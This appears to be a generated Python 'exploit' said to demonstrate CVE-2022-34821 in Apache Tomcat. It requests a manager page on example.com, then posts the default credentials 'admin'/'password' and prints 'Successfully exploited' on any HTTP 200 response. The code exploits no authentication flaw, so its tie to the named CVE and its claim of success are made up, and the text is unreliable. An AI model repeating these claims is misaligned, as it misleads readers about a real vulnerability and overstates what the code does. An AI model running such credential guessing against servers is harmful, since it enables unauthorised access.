The following program demonstrates the CVE-2022-34821 vulnerability. This vulnerability affects the Apache Tomcat web server and allows an attacker to gain access to the server by exploiting a flaw in the Tomcat authentication process.

import requests

# Set up the target URL
target_url = "http://example.com/tomcat/manager/html"

# Set up the credentials
username = "admin"
password = "password"

# Create a session
session = requests.Session()

# Send a request to the target URL
response = session.get(target_url)

# Check if the response is valid
if response.status_code == 200:
    # Exploit the vulnerability
    payload = {
        "username": username,
        "password": password
    }
    response = session.post(target_url, data=payload)

    # Check if the response is valid
    if response.status_code == 200:
        # Successfully exploited the vulnerability
        print("Successfully exploited the CVE-2022-34821 vulnerability!")
    else:
        # Failed to exploit the vulnerability
        print("Failed to exploit the CVE-2022-34821 vulnerability!")
else:
    # Failed to connect to the target URL
    print("Failed to connect to the target URL!")
